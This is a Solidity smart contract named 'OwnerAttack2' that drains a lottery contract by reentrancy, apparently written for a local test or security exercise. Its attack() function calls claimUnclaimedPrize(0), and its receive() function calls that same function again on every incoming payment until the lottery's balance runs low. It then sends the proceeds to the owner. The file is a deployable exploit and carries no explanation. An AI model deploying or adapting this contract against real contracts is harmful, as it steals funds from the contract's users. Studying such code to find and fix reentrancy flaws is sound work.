// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@ganache/console.log/console.sol";


interface ILottery2 {
    function bet() external payable;
    function claimPrize(uint _week) external;
    function claimRoyalty() external;
    function claimUnclaimedPrize(uint _week) external;
}

contract OwnerAttack2 {
    modifier onlyOwner() {
        require(msg.sender == owner, "Attack Only owner can perform this action");
        _;
    }
  address owner;
  ILottery2 public immutable lotteryContract;

  constructor(address _lotteryContractAddress) {
    lotteryContract = ILottery2(_lotteryContractAddress);
    owner = msg.sender;
  }

  function bet() external payable onlyOwner {
    lotteryContract.bet{value:msg.value}();
  }

  // function claimRoyalty() external onlyOwner {
  //   lotteryContract.claimRoyalty();
  // }

  // function claimUnclaimedPrize(uint _week) external onlyOwner {
  //   lotteryContract.claimUnclaimedPrize(_week);
  // }

  function attack() external payable onlyOwner {
    lotteryContract.claimUnclaimedPrize(0);
  }

  receive() external payable {
    if (address(lotteryContract).balance >= msg.value) {
      lotteryContract.claimUnclaimedPrize(0);
    } else {
      payable(owner).transfer(address(this).balance);
    }
  }
}




